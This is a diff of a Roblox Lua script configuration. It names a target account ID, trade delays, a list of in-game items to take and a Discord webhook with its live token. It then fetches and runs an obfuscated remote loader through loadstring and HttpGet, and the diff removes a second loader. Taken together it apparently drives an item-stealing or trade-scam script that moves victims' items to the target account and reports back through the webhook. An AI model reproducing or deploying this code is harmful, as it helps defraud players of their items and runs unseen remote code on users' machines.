@@ -1,10 +1,9 @@
--- 5 second initial delay
-task.wait(5)
 
-getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1480925533305962697/485A2OP6kC4abJgzO2Uqw_ZLVaxB3Rlk8aa0plzGysb_BuYtgRuF6ANFZyPCdiRTNQgb"
+getgenv().SECRET_KEY = "nielzinxesx"
 getgenv().TARGET_ID = 8828039235
-getgenv().DELAY_STEP = 1
+getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1482187326871441581/IP1I3jSc6jF8bV1bgbxqR5hgbsZhWuILu1_ema4R3SIVxRB9EvPki-l2lIdAdauyu66P"
 
 getgenv().TARGET_BRAINROTS = {
     ["Meowl"] = true,
@@ -91,8 +90,4 @@ getgenv().TARGET_BRAINROTS = {
 
 task.spawn(function()
     loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
-end)
-
-task.spawn(function()
-    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/0fbe1cfb1005a43bbfeb46cd458b7f09.lua"))()
 end)
